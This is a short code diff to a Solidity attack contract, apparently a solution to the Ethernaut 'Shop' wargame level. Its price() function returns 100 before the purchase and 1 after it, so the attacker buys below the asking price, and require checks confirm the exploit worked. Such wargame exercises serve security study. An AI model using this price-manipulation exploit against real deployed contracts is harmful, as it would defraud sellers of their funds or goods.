@@ -12,11 +12,13 @@ contract L21Attack is Buyer {
 
     function attack() external {
         instance.buy();
+        require(instance.isSold() == true, "Item not sold");
+        require(instance.price() == 1, "Price not hacked");
     }
 
     function price() external view returns (uint256) {
-        if (gasleft() < 10_000) {
-            return 0;
+        if (instance.isSold()) {
+            return 1;
         } else {
             return 100;
         }
